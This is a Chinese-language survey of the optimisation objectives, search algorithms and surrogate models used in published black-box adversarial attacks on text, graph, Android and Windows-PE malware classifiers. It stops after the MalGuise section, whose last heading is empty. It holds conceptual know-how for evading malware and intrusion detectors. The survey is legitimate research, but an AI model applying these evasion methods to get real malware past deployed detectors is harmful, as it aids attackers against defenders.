# 离散域黑盒对抗 — 奖励函数调研

> 调研项目 `reference_paper/` 收录的所有离散域黑盒对抗论文 + 同领域常用文献。每节顶部给"奖励函数总结",下面贴原文公式 + 引用 + 解释。
>
> **所有公式从原 PDF 直接核对引出。** 防御类(HagDe)不在此列。

---

## 黑/白盒 setting 审计

| 论文 | Setting | 备注 |
|---|---|---|
| TextFooler / PWWS / TEXTBUGGER(黑盒版)| 黑盒 (score-based) | ✓ |
| FCGHunter | 黑盒(SHAP via attacker-trained substitute) | ✓ |
| Nettack | **白盒 surrogate transfer attack** | ⚠ 严格非 query-based 黑盒,attacker 用 surrogate 上的梯度 |
| Discrete-Block BO / GRABNEL | 黑盒 (score-based) | ✓ |
| MalGuise | 黑盒 (w/ prob 或 w/o prob) | ✓ |
| BagAmmo / EvadeDroid / AdvDroidZero | 黑盒 (query-based) | ✓ |
| HRAT | **grey-box**(target 黑盒查询 + 用 substitute 梯度搜 feature 空间) | ⚠ Q-learning 用 surrogate 梯度 |
| ProvNinja / Goyal | 黑盒 (明确声明) | ✓ |
| Contorter | **白盒为主(用 model embedding + confidence),Table 3 有黑盒** | ⚠ 黑盒版只 TypeSel + FOpt |
| SPECTRA | 黑盒(只看 rule pass/fail,无 model 内部) | ✓ |

**全部核对完毕,无遗漏。**

---

## 总览(所有论文奖励函数)

| # | 论文 | 域 | 奖励函数 (1 行总结) | 核对 |
|---|---|---|---|---|
| 1 | TextFooler | text | 4 层硬过滤 + 能 fool target 的候选里 argmax USE 相似度 | ✓ |
| 2 | PWWS | text | `H = softmax(saliency) × ΔP_true_class` | ✓ |
| 3 | TEXTBUGGER | text | 重要度 `C_{x_i} = ∂F_y(x)/∂x_i` 排词,5 种 bug 选最佳;`S(x,x') ≥ ε` 硬约束 | ✓ |
| 4 | FCGHunter | Android FCG | NSGA-II 双目标:`f_1 = M(E(G+I))`, `f_2 = -Σ SHAP·ΔE` | ✓ |
| 5 | Nettack | graph node | `max_{c≠c_old} ln Z*_c - ln Z*_{c_old}` (CW) + 度/共现硬约束 | ✓ |
| 6 | Discrete-Block BO | text | `min d_Hamming s.t. L_CW ≥ 0`,Stage 1 max L → Stage 2 min d | ✓ |
| 7 | GRABNEL | graph cls | `L_attack = max_{t≠y} log f(G')_t - log f(G')_y` (CW), `Δ ≤ rn²` 硬约束 | ✓ |
| 8 | MalGuise | Windows PE | `argmax_T g(z) - g(z_adv)`(w/ prob) 或 `argmin_T f(z_adv)` (w/o prob) | ✓ |
| 9 | BagAmmo | Android FCG | `T = 1 - F(x)` (threat) + `L =` 加边数,**串行 selection** | ✓ |
| 10 | HRAT | Android FCG | `R = 1 if f(Ĝ)≠f(G) else -(ΔN_node+ΔN_edge)`(RL reward Eq 7) | ✓ |
| 11 | EvadeDroid | Android | (b) Preparation: n-gram 筛 donor → 限定 Δ(Eq 4-5);(a) RS: `argmax g_{y=0}(φ(T_δ(z)))`;硬约束 `q ≤ Q` + `c ≤ α`(budget) | ✓ |
| 12 | AdvDroidZero | Android | 树概率根据"前后 malicious confidence 变化"自适应调整 | ✓ |
| 13 | ProvNinja | provenance | 无单一 fitness;**regularity 分数** `R_e = Freq(u,v,r)/Freq(u,*,r)` 选 gadget | ✓ |
| 14 | Goyal | provenance | **embedding 距离** `Dist = F^δ(V_N, V_E)`,迭代加 benign 子结构直至 Dist < threshold | ✓ |
| 15 | Contorter | provenance | 4 模块 pipeline:TypeSel → FOpt(`e_min ≤ \|e(n)\| ≤ e_max`)→ CSMax(`cos(e_m, e_c)`)→ ImpMax(target confidence) | ✓ |
| 16 | SPECTRA | command line(SIEM Sigma)| 多阶段 pipeline:effect-key 索引 → α(effect alignment)+ β(binding coverage)排序 → avoid-set 硬约束 → Φ_R(E(ĉ))=FALSE 终止 | ✓ |
| 17 | HQA-Attack | text (hard-label) | `x* = argmax Sim(x, x'), s.t. f(x') ≠ f(x)`(Eq 2);两阶段:substitute back + transition word optimization | ✓ |
| 18 | TextHoaxer | text (hard-label) | `min L = λ_1·ℓ_sim + λ_2·ℓ_pwp + λ_3·ℓ_spa, s.t. f(x') ≠ f(x)`(Eq 5,加权融合) | ✓ |

---

## 1. TextFooler (Jin et al. AAAI'20)

### 优化问题方程(原文)

**原文无显式数学优化问题方程。**

### 优化问题总结

原文不写数学方程,算法直接 greedy 选词。攻击意图:让 target 错分类 + USE 语义相似度高 + 改的词数少。fool 是硬条件(进入候选集前提),USE 相似度是排序信号,扰动词数靠 greedy 逐词改控制。

### 奖励函数(原文)

**Step 1 词重要度(Eq 2):**
```
I_{w_i} = { F_Y(X) - F_Y(X_{\w_i}),                       if F(X) = F(X_{\w_i}) = Y
          { (F_Y(X) - F_Y(X_{\w_i})) + (F_{Ȳ}(X_{\w_i}) - F_{Ȳ}(X)),
                                                          if F(X) = Y, F(X_{\w_i}) = Ȳ, Y ≠ Ȳ
```

**Step 2 替换 4 层过滤 + 选词规则:**
```
(a) Synonym Extraction: N=50, counter-fitted word emb cos > δ=0.7
(b) POS Checking: 同 POS
(c) Semantic Similarity: cos(USE(X), USE(X_adv)) > ε
(d) Finalization:
    - 若 FINCANDIDATES 里有候选能 fool target → argmax USE 相似度
    - 否则 → argmin true label confidence (逼近决策边界)
```

### 奖励函数总结

两步走:① Step 1 算每个位置词重要度 I_{w_i},按降序排序决定动哪个位置 ② Step 2 在 4 层过滤通过的候选集里,**能 fool target 的挑 USE 相似度最高的;都不能 fool 就挑让 target 对真实类信心最低的**。

不是看哪个候选攻击效果最强,而是**先用过滤器筛掉"明显不像话"的候选**(语义偏 / 词性错 / 改停用词),**再在"能改判"的候选里挑"跟原句最像"的**。属于"(a) binary 入场券 + (b) 主排序"模式。


### 搜索算法(原文)

Algorithm 1 + §Method:"The proposed approach … consists of the two main steps: Step 1: Word Importance Ranking … Step 2: Word Transformer … Overall, the algorithm first uses Step 1 to rank the words by their importance scores, and then repeats Step 2 to find replacements for each word in the sentence X until the prediction of the target model is altered."

### 搜索算法总结

贪婪逐词替换:先按重要度排序所有词,再顺序替换;若已翻转预测则选 USE 相似度最高的候选,否则选使目标类置信度最低的候选。

### Fitness(原文)

重要度 Eq. (2):`I_{w_i} = F_Y(X) − F_Y(X_{\w_i})`(同标签时);候选打分(Algorithm 1 lines 13–17):`c* ← argmax_{c∈FINCANDIDATES} Sim(X, X'_{w_j→c})` 或未翻转时 `argmin P_k`。

### Fitness 总结

两层标量:词级用删词后真类概率下降 I_{w_i};候选级用 USE 语义相似度过滤后,按"翻转后 sim 最大 / 未翻转时目标类置信度最小"打分。

### 替代模型(原文)

§Threat Model:"It can only query the target model with supplied inputs, getting as results the predictions and corresponding confidence scores." Algorithm 1 直接调用 `Y_k ← F(X')`、`P_k ← F_{Y_k}(X')`。

### 替代模型总结

**原文无 surrogate model**,直接 query target 拿 soft-label。

---

## 2. PWWS (Ren et al. ACL'19)

### 优化问题方程(原文)

**Eq 1-3(§3.1):**
```
x* = x + Δx,  ||Δx||_p < ε                                  (Eq 3, perturbation budget)

argmax_{y_i ∈ Y} P(y_i | x*) ≠ argmax_{y_i ∈ Y} P(y_i | x)   (Eq 2, adv condition)
```

**约束(§3.2):**
- 候选替换词 w_i' ∈ L_i = WordNet(w_i) ∪ {NE_adv 若 w_i 是 NE}
- 词性保持(POS 一致)

### 优化问题总结

正式优化问题(Eq 1-3):找一个扰动 Δx 让 target 把 x* = x + Δx 分类成跟 x 不同的类,扰动的 p-norm 受 ε 限制。候选替换必须来自 WordNet 同义词集(或 NE 替代集)。**(a) 攻击成功是主目标,(b) WordNet 同义词限制 + p-norm 是硬约束**。

### 奖励函数(原文)

**Eq 7 替换得分:** `H(x, x_i^*, w_i) = φ(S(x))_i · ΔP_i^*`

**各项定义:**
```
ΔP_i^* = P(y_true | x) - P(y_true | x_i^*)              (Eq 5, 替换 w_i 为最佳替换词 w_i^* 后 P_true 下降)
w_i^* = argmax_{w_i' ∈ L_i} {P(y_true | x) - P(y_true | x_i')}   (Eq 4, 最佳替换词)
S(x, w_i) = P(y_true | x) - P(y_true | x̂_i)             (Eq 6, saliency, x̂_i 把 w_i 换成 UNKNOWN)
φ = softmax                                               (Eq 8, 作用在 saliency 向量上)
```

### 奖励函数总结

每个位置打 H 分,分高的优先改。**H = "位置重要度(softmax 归一化的 saliency)" × "在该位置最佳替换词的 P_true 下降量"**。

算法分 4 步:① 对每个位置 i 算 saliency S_i(把 w_i 换成 UNKNOWN 看 P_true 掉多少)→ 得到 saliency 向量 ② 整个向量过 softmax 归一化得 φ(S(x))③ 在同义词集里找让 P_true 掉得最多的替换词 w_i^*,记下 ΔP_i^* ④ H_i = φ(S(x))_i × ΔP_i^*。

按 H 降序遍历位置改词,target 翻车即停。**softmax 先作用在 saliency 向量上,再乘 ΔP,顺序不能反**。属于"(a) 进 fitness + (b) 同义词集作硬过滤"模式。


### 搜索算法(原文)

Algorithm 1 (§3.2.2):"Reorder w_i such that H(x, x*_1, w_1) > · · · > H(x, x*_n, w_n); for all i = 1 to n do Replace w_i in x^{(i−1)} with w*_i; if F(x^{(i)}) ≠ F(x^{(0)}) then break."

### 搜索算法总结

贪婪算法:一次性按 H 综合得分排序后,按固定顺序逐词替换为预选最优同义词 w*_i 直到标签翻转。

### Fitness(原文)

Word saliency Eq. (6):`S(x, w_i) = P(y_true|x) − P(y_true|x̂_i)`;substitute selection Eq. (4):`w*_i = argmax_{w'_i ∈ 𝕃_i} { P(y_true|x) − P(y_true|x'_i) }`;最终 Eq. (7):`H(x, x*_i, w_i) = φ(S(x))_i · ΔP*_i`。

### Fitness 总结

标量 fitness = softmax(显著性 S) × 最佳同义词替换带来的真类概率下降 ΔP*_i。

### 替代模型(原文)

§3.1 直接用目标 F 的后验:"Given a trained natural language classifier F … based on the maximum posterior probability";Eq. (4-6) 中 P(y_true|·) 均来自 F。

### 替代模型总结

**原文无 surrogate model**,直接 query target F 取后验。

---

## 3. TEXTBUGGER (Li et al. NDSS'19) — **黑盒版**

### 优化问题方程(原文)

**§II.A:**
```
find x_adv = x + Δx s.t.:
   F(x_adv) = t,  t ≠ y                    (改成 target class)
   S(x, x_adv) ≥ ε                          (语义相似度阈值, S = USE 余弦)

ε ∈ ℝ 是 utility 保留的下界
S 用 USE (Universal Sentence Encoder) embedding cosine 实现
```

### 优化问题总结

找一个扰动文档让 target 错分类成指定类别 t,同时保证整句的语义相似度(USE cosine)≥ ε。**(a) 攻击成功是主目标,(b) USE 相似度是硬约束**。

### 奖励函数(原文)

**句子重要度(Algorithm 3 line 3):**
```
C_{sentence}(i) = F_y(s_i)            # 整句过 classifier 拿真实类置信度
```

**词重要度(Eq 3,黑盒版 — leave-one-out):**
```
C_{w_j} = F_y(w_1, ..., w_m) - F_y(w_1, ..., w_{j-1}, w_{j+1}, ..., w_m)
        = "保留 w_j 跟删掉 w_j 后, target 给真实类 y 的置信度差"
```

**Bug 选择(Algorithm 2):**
```
for b_k in BugGenerator(w):              # 5 种 bug: Insert/Delete/Swap/Sub-C/Sub-W
   candidate_k = replace w with b_k in x
   score_k = F_y(x) - F_y(candidate_k)   # 置信度下降量
bug_best = argmax_k score_k
```

**硬约束:** `cos(USE(x), USE(x')) ≥ ε`

### 奖励函数总结

黑盒下没梯度,改用 query 算重要度。三步:① **句子重要度** = 整句过 target 拿真实类置信度,P 高 = 重要,优先动 ② **词重要度**(Eq 3) = 删词前后 P_y 差(leave-one-out)③ **Bug 选最佳** = 5 种 bug(Insert / Delete / Swap / Sub-C 视觉相似 / Sub-W 近义词)都试,挑让 P_y 掉得最多的。

USE 句级相似度 ≥ ε 作硬约束,候选过不了门就丢。属于"(a) 进 fitness(置信度下降量)+ (b) USE 阈值作硬过滤"模式。


### 搜索算法(原文)

Algorithm 3:"Compute C_{sentence}(i) = F_y(s_i); … S_ordered ← Sort(sentences) … for s_i in S_ordered do for w_j in s_i do Compute C_{w_j} according to Eq.3 … bug = SelectBug(w_j, x', y, F(·)); x' ← replace w_j with bug in x'; if S(x, x') ≤ ε then Return None. else if F_l(x') ≠ y then Return x'."

### 搜索算法总结

分层贪婪:先按句级置信度排句子,再按词级显著性 C_{w_j} 排词,逐词调用 SelectBug 注入 5 种 bug,命中翻转即返回,违反 USE 阈值 ε 即放弃。

### Fitness(原文)

Eq. (3):`C_{w_j} = F_y(w_1, …, w_m) − F_y(w_1, …, w_{j−1}, w_{j+1}, …, w_m)`;SELECTBUG:`score(k) = F_y(x) − F_y(candidate(k))`。

### Fitness 总结

标量 fitness = 真类置信度下降(句级 / 词级 / bug 级);USE 相似度 ε 作硬约束。

### 替代模型(原文)

§II.B Black-box Setting:"only capable of querying the target model with output as the prediction or confidence scores"。

### 替代模型总结

**原文无 surrogate model**,直接 query target 拿置信度。

---

## 4. FCGHunter (Sen Chen TSE'25)

### 优化问题方程(原文)

**双目标 NSGA-II(MLP,Eq 4):**
```
maximize    (f_1(I), f_2(I))                              (NSGA-II multi-obj)
over        I = (o_1, o_2, ..., o_n),  o_j ∈ 7 operators
            (7 operators: Add Node / Add Edge / Rewire / Remove Node /
             Add Sparse Nodes / Add Dense Nodes / Add Long Edges)

subject to (§VI-B Operator Constraints,5 个命名约束):
   - System Method Protection         (Android framework methods 不可改)
   - Lifecycle Method Protection      (onCreate/onDestroy 等不可改)
   - JVM Special Method Protection    (<init>/<clinit> 不可改)
   - Cycle Prevention                 (加边时检测 cycle, 保 FCG acyclic)
   - Inheritance Safety Checks        (含 invoke-virtual 的方法不能用 Remove Node)
```

**Dominance(Eq 5,lexicographic 不是 pure Pareto):**
```
x dominates y iff:
   f_1(x) > f_1(y), OR
   f_1(x) == f_1(y) AND f_2(x) > f_2(y)
```

### 优化问题总结

多目标 Pareto formulation。同时优化 (f_1, f_2) 两个目标,通过 7 条 operator 约束保证扰动不破坏 APK 功能。**Lexicographic dominance** — f_1 绝对优先,f_1 相等才看 f_2。三种 model(MLP / KNN / Ensemble)各有不同 f_1 公式,但 dominance 规则跟约束统一。

### 奖励函数(原文)

**MLP fitness(Eq 4):**
```
f_1(I) = M(E(G + I))                                       # target benign 概率
f_2(I) = -Σ_i SHAP(M, G, I)_i · (E(G)_i - E(G+I)_i)        # SHAP 加权扰动方向
```

**Instance-based KNN(Eq 6):**
```
f_1(I) = (1/x) Σ_{i=1}^k (M(I)_i^m - M(I)_i^b)            # 距 benign 近 + 距 malware 远
   M(I)_i^m = 到第 i 近 malware sample 距离
   M(I)_i^b = 到第 i 近 benign sample 距离
f_2(I) = -Σ SHAP(M', G, I)_i · (E(G)_i - E(G+I)_i)        # M' = surrogate MLP 估 SHAP
```

**Ensemble RF/AdaBoost(Eq 7):**
```
fitness(I) = Σ_{c ∈ C} SAT(G, M, I, c)                     # 满足的 benign 决策约束数
   SAT = 1 if 约束 c 被满足, else 0
```

### 奖励函数总结

双目标 NSGA-II,**不合成单标量**:
- **f_1**:target 觉得"这个图是良性"的概率(越高越好,直接攻击效果)
- **f_2**:扰动方向是否顺着 SHAP 解释把图推向良性(SHAP 告诉哪些特征"推向恶意"哪些"推向良性",f_2 鼓励**减少推恶意的特征 + 增加推良性的特征**)

NSGA-II 选个体规则 lexicographic:f_1 高的优先,f_1 一样再看 f_2。三种 model 的 f_1 形式不同(MLP 直接 target 概率;KNN 距离比较;Ensemble 决策约束计数),但 f_2 都是 SHAP 加权扰动方向。属于"双目标 Pareto"模式(类 5),实际 dominance 偏 lexicographic。


### 搜索算法(原文)

§IV:"Step 2: FCGHunter employs a GA to optimize perturbations in the identified critical area." §VI:"Each individual in the population is represented as a sequence of perturbations, where each gene is not just a single perturbation but a sub-sequence of dependent perturbations."

### 搜索算法总结

依赖感知的遗传算法 (NSGA-II 框架),个体 = perturbation 序列,以子序列为基因执行 crossover/mutation。

### Fitness(原文)

Eq. (4):`fitness1(I) = M(E(G+I))`;`fitness2(I) = −Σ SHAP(M,G,I)_i · (E(G)_i − E(G+I)_i)`。§IV:"a multi-objective score for MLP classifiers, a surrogate model approach for instance-based classifiers, and a constraint-based solution for decision tree classifiers."

### Fitness 总结

多目标 fitness 向量 (f_1, f_2):f_1 = 目标输出概率,f_2 = SHAP-加权特征变化和;KNN 改用 surrogate,DT 改用约束反馈。

### 替代模型(原文)

§IV:"a surrogate model approach for instance-based classifiers";Fig 1 标注 "Substitute Model" 仅在 instance-based / ensemble 分支出现。

### 替代模型总结

仅对 KNN 类(instance-based)目标用 substitute 作 fitness 评估代理,MLP / DT 不用,非全局必需。

---

## 5. Nettack (Zugner et al. KDD'18)

### 优化问题方程(原文)

**Problem 1(基础):**
```
argmax     max_{c ≠ c_old} ln Z*_{v_0, c} - ln Z*_{v_0, c_old}
(A', X') ∈ P_{Δ,A}^{G_0}

subject to:
   Z* = f_θ*(A', X'),  θ* = argmin_θ L(θ; A', X')   (poisoning, bi-level)
   或 θ* 固定 (evasion)

P_{Δ,A}^{G_0} = 所有满足约束的修改后图集合
   X'_ui ≠ X_ui ⟹ u ∈ A                            (attacker nodes only, Eq 4)
   A'_uv ≠ A_uv ⟹ u ∈ A ∨ v ∈ A
   Σ_{u,i} |X'_ui - X_ui| + Σ_{u<v} |A'_uv - A_uv| ≤ Δ   (budget, Eq 5)
```

**Problem 2(加 unnoticeable 约束,§4.1):**
```
同 Problem 1, 再加:
   Λ(G_0, G') < τ ≈ 0.004                    (Eq 10, 度分布 power-law 检验)
   ∀u, ∀i ∈ F : X'_ui = 1 ⟹ p(i | S_u) > σ    (Eq 12, feature 共现)
```

### 优化问题总结

正式 bi-level optimization。**外层** max CW margin(让非真实类的 log-prob 超过真实类最多),**内层** 在扰动后的图上重训 GCN(poisoning setting)或保持原 GCN(evasion setting)。**硬约束**:扰动预算 Δ + attacker 控制节点 A + 度分布 power-law 检验 + 特征共现 σ-test。

属于"白盒 surrogate 攻击 + transfer 到 target",严格非 query-based 黑盒。

### 奖励函数(原文)

**白盒 surrogate attack(线性化 GCN):**
```
maximize  max_{c ≠ c_old} ln Z*_{v_0, c} - ln Z*_{v_0, c_old}     ← CW margin

其中:
  c_old = v_0 的原真实类别
  c     = 任意其他类别
  Z*    = surrogate (线性化 GCN) 的 log-probability
```

**硬约束(Eq 10, Eq 12):**
```
度分布 (Eq 10): Λ(G_0, G') < τ ≈ 0.004
  Λ = power-law likelihood ratio test statistic (Eq 9)
  τ = 0.95 critical value
  
特征共现 (Eq 12): σ-test 通过
  p(i | S_u) > σ ≈ 0.5 · 1/|S_u| · Σ_{j ∈ S_u} 1/d_j
  只能加跟 u 已有特征"共现概率"够高的新特征
```

### 奖励函数总结

CW margin 是单标量 fitness — **让"非真实类别"得分比"真实类别"高得最多**。例:目标节点真实类是猫,有候选类别(狗/鸟/鱼),找一个非猫类让其 log-prob 超过猫 log-prob 最多。差 > 0 即攻击成功(误判)。

(b) 全是**硬约束不进 fitness**:度分布扰动后还得通过 power-law 检验;加特征只能加"以前共现过的"。违反任一约束的候选直接丢掉,只在合规候选里 max CW margin。属于"(a) 进 fitness + (b) 作硬过滤"模式。


### 搜索算法(原文)

§5 Algorithm 1:"following a locally optimal strategy, we sequentially 'manipulate' the most promising element … given the current state of the graph G^(t), we compute a candidate set C_struct of allowable elements (u,v) … Among these elements we pick the one which obtains the highest difference in the log-probabilites, indicated by the score function s_struct(e;G^(t),v0). … Whichever change obtains the higher score is picked … This process is repeated until the budget ∆ has been exceeded."

### 搜索算法总结

顺序贪婪:每步在合法候选集 C_struct ∪ C_feat 中选 surrogate loss 提升最大的单个边/特征翻转,直到耗尽预算 ∆。

### Fitness(原文)

Eq. (14):`L_s(A,X;W,v0) = max_{c≠c_old} [Â² X W]_{v0 c} − [Â² X W]_{v0 c_old}`;Eq. (15-16):`s_struct(e;G,v0) := L_s(A',X;W,v0)`、`s_feat(f;G,v0) := L_s(A,X';W,v0)`。

### Fitness 总结

标量 fitness = 翻转后 surrogate 模型对目标节点的"最佳错类 logit − 真类 logit" CW margin;受 Pˆ_{∆,A} 不可察觉约束(度分布 χ² + 共现随机游走)过滤。

### 替代模型(原文)

§5 Eq. (13):"To obtain a tractable surrogate model that still captures the idea of graph convolutions, we perform a linearizion of the model from Eq. 2. That is, we replace the nonlinearity σ(.) with a simple linear activation function, leading to: Z' = softmax(Â Â X W^(1) W^(2)) = softmax(Â² X W)"。

### 替代模型总结

**有 surrogate:线性化 2 层 GCN(softmax(Â² X W))**,干净图上交叉熵预训练,贪婪攻击该 surrogate 后再迁移到 GCN/CLN/DeepWalk。

---

## 6. Discrete-Block BO (Lee et al. ICML'22)

### 优化问题方程(原文)

**Eq 1(§3.1):**
```
minimize    d(s, s')
over        s' ∈ ∏_{i=0}^{l-1} C(w_i) ⊆ X^l

subject to:
   L(f_θ(s'), y) ≥ 0
   L(f_θ(s), y) = max_{y' ∈ Y, y' ≠ y} f_θ(s)_{y'} - f_θ(s)_y    (CW margin, Eq 2)

d = Hamming distance
C(w_i) = 第 i 位置 semantically similar candidates (词向量预筛)
```

**两 stage 分解(Stage 1 = Eq 2; Stage 2 见 §4.2):**
```
Stage 1 (Eq 2): argmax_{s' ∈ S}  L(f_θ(s'), y)
                找到 L ≥ 0 的 s_adv

Stage 2 (Post-Optimization, §4.2):
                argmin_{s' ∈ S}  d(s, s')
                s.t.  L(f_θ(s'), y) ≥ 0
```

### 优化问题总结

正式 constrained optimization:**最小化 Hamming 扰动量,同时 CW margin 必须 ≥ 0**(即攻击成功)。候选词限定为 "语义近义词集" C(w_i),用 word embedding 预筛。

实际算法**两 stage 串行**:Stage 1 用 BO max CW margin 找到任意一个 adv example;Stage 2 切换目标用 BO min Hamming,条件是 CW margin 仍 ≥ 0 — 把改过的 token 尽量替回原 token。

### 奖励函数(原文)

**Stage 1 (Eq 2) BO 目标:**
```
maximize  L(f_θ(s'), y) = max_{y' ≠ y} f_θ(s')_{y'} - f_θ(s')_y    ← CW margin
over      s' ∈ ∏_{i=0}^{l-1} C(w_i)

终止: L(s') ≥ 0
```

**Stage 2 (§4.2 Post-Optimization) BO 目标:**
```
minimize  d(s, s')                                                   ← Hamming distance
over      s' ∈ ∏ C(w_i)
s.t.      L(f_θ(s'), y) ≥ 0                                          ← 保留 Stage 1 成功
```

**候选预筛(硬约束):** `C(w_i) ⊆ X` = 用 word emb 选 semantically similar tokens。

### 奖励函数总结

两个目标**串行,不合成一个 reward**:① **Stage 1** BO max CW margin,找到任意能 fool target 的 adv example ② **Stage 2** BO min Hamming,目标换成"改的 token 数最少",条件 CW margin 仍 ≥ 0。

候选词限定"语义近义词"(word emb 预筛),不会出现奇怪替换。属于"(a) Stage 1 → (b) Stage 2 串行"模式。Stage 1 跟 GRABNEL 同(只 CW margin),Stage 2 多走一步缩扰动。


### 搜索算法(原文)

§4.2:"we decompose an input sequence into disjoint blocks of element positions and optimize each block in a sequential fashion for several iterations using data subsampled from the evaluation history corresponding to the block." §4.2.1:"we sequentially optimize each block for R iterations … For each iteration, we set the maximum query budget to N_k when optimizing the block M_k."

### 搜索算法总结

分块贝叶斯优化 (Blockwise BO):把序列按重要性切成 ⌈l/m⌉ 块,按块顺序在 ∏C(w_i) 同义词空间各跑 R 轮 BO,找到 adv 后再 post-optimization 缩 Hamming 距离。

### Fitness(原文)

§4.2.3:"We utilize expected improvement … EI(x) = E[max(g(s') − g_D*, 0)]";黑盒目标 Eq. (2):`maximize L(f_θ(s'), y)`,L = `max_{y'≠y} f_θ(s)_{y'} − f_θ(s)_y`。

### Fitness 总结

真实评估值 g = CW-style logit margin L;BO 内部用 GP 后验上的 EI + DPP 多样性批选 N_b 个 1-Hamming 邻域候选。

### 替代模型(原文)

§4.1:"We use a categorical kernel with automatic relevance determination (ARD) … K^cate(s^(1), s^(2)) = σ_f² ∏ exp(−1[w_i^(1) ≠ w_i^(2)] / β_i)";"The GP parameter β_i is estimated by maximizing the posterior probability of the evaluation history under a prior using the gradient descent with Adam optimizer"。

### 替代模型总结

**有 surrogate:GP + ARD categorical kernel**,Adam 极大化后验估计 β_i,Subset-of-Data (FPC, Algorithm 1) 应对 O(n³) 复杂度。

---

## 7. GRABNEL (Wan et al. NeurIPS'21)

### 优化问题方程(原文)

**Eq 1(§2):**
```
maximize    ℒ_attack(f_θ(G'), y)
over        G' ∈ Ψ(G)

ℒ_attack = CW margin (Eq 2):
   untargeted: max_{t ∈ Y, t ≠ y} log f_θ(G')_t - log f_θ(G')_y
   targeted:   log f_θ(G')_t - log f_θ(G')_y           (固定 target class t)

Ψ(G) = 所有可能的扰动图集合, 通过 δA, rewire 或 node injection
```

**预算硬约束:**
```
‖δA‖_0 ≤ Δ                                            (边修改数)
Δ ≤ rn², r = 0.03                                     (节点数 n 的 3% 平方)
query 总数 B = 40Δ ≤ 2 × 10^4
```

### 优化问题总结

正式 constrained maximization:max CW margin,subject to 总边修改数 Δ 跟 query 数 B 都受限。Ψ(G) 是所有可能扰动图集合(通过加/删边、rewire、node injection)。**(a) 攻击效果是唯一目标**,**(b) 隐蔽性纯靠硬预算控制**(数量上限,没有"扰动质量"软信号)。

### 奖励函数(原文)

**Eq 2(CW margin loss):**
```
L_attack(f_θ(G'), y) = { max_{t ∈ Y, t ≠ y} log f_θ(G')_t - log f_θ(G')_y   (untargeted)
                      { log f_θ(G')_t - log f_θ(G')_y                       (targeted, class t)
```

**硬约束:** `Δ ≤ rn² (r=0.03)`,query `B = 40Δ ≤ 2×10^4`。

### 奖励函数总结

目标只有一个 — **CW margin(让非真实类得分超过真实类最多)**。跟 Nettack 同公式,但 GRABNEL 是**真正黑盒**(只查 target 拿 logits,不用 surrogate 梯度)。

隐蔽性(不被人发现是攻击)完全靠**硬约束** Δ ≤ rn²(总共改的边数不能超 3% 节点数²),**没有软的 reward 项控制扰动质量**。BO + 内层 GA 在边数预算内 max CW margin。属于"只 (a),(b) 全是硬预算"模式。


### 搜索算法(原文)

§2:"we amortise B into ∆ stages and focus on selecting one edge perturbation at each stage … At each BO iteration, acquisition function α(·) is optimised to select the next point(s) to query the victim model f_θ. … we optimise α via an adapted version of the Genetic algorithm (GA) … we only query the surrogate instead of the victim model"。

### 搜索算法总结

顺序贝叶斯优化(预算 B 摊到 ∆ 阶段)+ 内层 GA 在 1-edit 邻域上优化 acquisition,只在 surrogate 上评估个体,每阶段对 victim 1 次真 query。

### Fitness(原文)

Eq. (2):`L_attack = max_{t∈Y, t≠y} log f_θ(G')_t − log f_θ(G')_y`(untargeted);§2 Evolution:"we follow the standard evolution routine by evaluating the acquisition function value for each member as its fitness"。

### Fitness 总结

真实目标 = CW-style 错类-真类对数概率差 L_attack(>0 即攻击成功);BO 内层 GA 用 surrogate 上的 acquisition α(·) 当 fitness 排个体。

### 替代模型(原文)

§2 Surrogate model:"we propose to first use a Weisfeiler-Lehman (WL) feature extractor … followed by a sparse Bayesian linear regression which balances performance with efficiency and gives an probabilistic output";Eq. (5-7):`L_attack | Φ, α, σ_n² ~ N(α^⊤ Φ, σ_n² I); α | λ ~ N(0, Λ); λ_i ~ Gamma(k, θ)`。

### 替代模型总结

**有 surrogate:WL 子树核 + 带 ARD 先验的 Sparse Bayesian Linear Regression**,历史 (Φ, L_attack) 训练,O(Hm) 复杂度可扩展到 10³ 节点。

---

## 8. MalGuise (Ling et al. USENIX'24)

### 优化问题方程(原文)

**§3.1 Eq 1-4:**
```
w/ predicted probabilities (Eq 1):
   argmax_T   g(z) - g(z_adv)
   
w/o predicted probabilities (Eq 2):
   argmin_T   f(z_adv)

subject to (Eq 3):
   f(z) = 1, f(z_adv) = 0          (原是 malware, 扰动后判 goodware)
   z_adv = T(z) ∈ Z                  (扰动结果仍是合法 PE, semantics preserved)

T = T_1 ∘ T_2 ∘ ... ∘ T_n ∈ 𝕋   (Eq 4, transformation 序列)

f : Z → Y    (label classifier)
g : Z → ℝ    (malicious probability)
Y = {0=goodware, 1=malware}

每个 T_k 是 call-based redividing transformation:
   T_k = {𝕀_k^call, 𝕀_k^s-nops}     (call instruction + semantic nops)
```

**额外约束(§4.1.5 Implementation):**
- semantic nops size ≤ 5% of original
- N ≤ 6 (max transformation length)
- C = 40 (computational budget)

### 优化问题总结

两种黑盒 setting 分别 formulate:**w/ prob** 最大化 "原图恶意概率 - 扰动后恶意概率"(让 g 掉得最多);**w/o prob** 直接 minimize 预测标签(从 1=malware → 0=goodware)。两种 setting 都要求 z_adv 仍是合法 PE(semantics 保持),且 semantic nops size 不能超原文件 5%。变换 T 是 call-based redividing transformation 的序列组合。

### 奖励函数(原文)

```
Eq 1 (w/ prob):   argmax_T g(z) - g(z_adv)
                  g : Z → [0, 1] = malicious probability

Eq 2 (w/o prob):  argmin_T f(z_adv)
                  f : Z → {0=goodware, 1=malware} = predicted label

Eq 3 约束: f(z) = 1, f(z_adv) = 0, z_adv = T(z) ∈ Z
Eq 4: T = T_1 ∘ T_2 ∘ ... ∘ T_n ∈ 𝕋  (变换序列)

MCTS Algorithm 1: reward ← Simulation(v_selected, f, S)
                  (Simulation 隐式实现上述 Eq 1 或 Eq 2 目标)
```

### 奖励函数总结

两种黑盒情境分别处理:**能拿 confidence(w/ prob)**:目标 = "原图被判恶意的概率 - 扰动后恶意概率",越大越好;**只能拿 binary label(w/o prob)**:目标 = 直接 minimize 预测标签(1→0)。

MCTS 顺着这个 reward 找最佳"变换序列 T = T_1 ∘ T_2 ∘ ... T_n"。每个 T_k 是 call-based redividing transformation(把基本块拆成 3 块塞 semantic nops)。**硬约束** semantics 保持 + size ≤ 5%(不能膨胀太多)。属于"只 (a),validity/size 是硬约束"模式。


### 搜索算法(原文)

